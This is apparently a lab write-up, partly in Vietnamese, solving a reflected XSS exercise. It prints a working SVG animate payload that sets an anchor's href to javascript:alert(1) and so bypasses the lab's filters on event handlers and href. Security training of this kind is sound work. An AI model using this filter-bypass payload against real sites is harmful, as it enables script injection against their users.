# Target Goal: 

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

# Recon: 

Bài lab này đã bi chặn toàn bộ thẻ tag. Tuy nhiên ta vẫn có gợi ý dùng `href` để thực hiện XSS

Có một thứ khá hay, ta có thể tận dụng ở [animate tag](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate) được sử dụng như được gọi hàm (ở đây là attributeName) để chạy được hàm đó (href) 
```
<svg>

<a>

<animate attributeName="href"
          values=javascript:alert(1)></animate>
<text x="20" y="30"> Click here </text> //thẻ text bắt buộc phải có tọa độ

</a>

</svg>
```
# Flag: 

![Uploading image.png…]()
